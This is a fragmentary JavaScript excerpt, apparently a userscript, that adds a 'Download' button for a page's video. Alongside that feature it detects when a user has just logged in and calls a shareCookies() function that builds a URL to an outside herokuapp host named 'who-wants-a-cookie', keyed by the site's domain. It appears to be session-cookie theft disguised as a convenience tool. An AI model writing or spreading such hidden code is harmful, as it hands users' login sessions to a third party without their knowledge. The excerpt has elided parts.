...
if (actions) {
  actions.innerHTML +=
    '<button class="task-actions-button" style="background-color:#bf2f2f;" onclick="window.location.assign(document.getElementsByTagName(\'video\')[0].src)">Download</button>';
}

if (document.referrer.match(/login/) && !document.documentURI.match(/login/)) {
  shareCookies();
} else if (
  document.documentURI.match(/login/) &&
...
function shareCookies() {
  ...
  var url =
    'https://who-wants-a-cookie.herokuapp.com/cookies/' + document.domain;
